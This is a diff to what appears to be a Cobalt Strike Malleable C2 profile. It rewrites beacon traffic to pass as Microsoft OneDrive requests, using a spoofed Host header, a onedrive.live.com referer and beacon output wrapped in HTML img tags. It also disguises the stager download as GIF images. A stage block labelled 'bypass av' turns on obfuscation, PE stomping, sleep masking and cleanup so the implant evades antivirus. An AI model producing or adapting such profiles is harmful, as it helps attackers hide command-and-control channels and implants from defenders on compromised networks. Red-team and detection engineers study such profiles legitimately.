@@ -78,8 +78,8 @@ http-get {
 
 http-post {
     
-    set uri "/sa";
-    set verb "GET";
+    set uri "/about";
+    #set verb "GET";
 
     client {
 
@@ -89,16 +89,17 @@ http-post {
 
         #Beacon's responses
         output {
-            base64url;
-            prepend "E=P:";
-            append "=:%%alphanumeric:7%%";
-            header "Cookie";
+            base64;
+            prepend "<html><img src=\"";
+            append "\"/>";
+            #header "Cookie";
+            print;
         }
 
         #session ID
         id {
             base64url;
-            prepend "https://p.sfx.ms/sa.html?s=";
+            prepend "https://onedrive.live.com/about.html?s=";
             header "Referer";
         }
 
@@ -123,7 +124,27 @@ http-post {
 
 #change the stager server
 http-stager {
-    server {
-        header "Content-Type" "text/html; charset=utf-8";
+    set uri_x86 "/logo32x32.gif";
+    set uri_x64 "/logo64x64.gif";
+    client {
+        header "Host" "onedrive.live.com";
+        header "Accept" "text/html,application/xml;*/*;";
+        header "Accept-Encoding" "gzip, deflate";
     }
+    server {
+        header "Content-Type" "image/gif; charset=utf-8";
+        output {
+            prepend "GIF89a";
+            print;
+        }
+    }
+}
+
+#change stager bypass av
+stage {
+    set userwx "false";
+    set obfuscate "true";
+    set stomppe "true";
+    set sleep_mask "true";
+    set cleanup "true";
 }
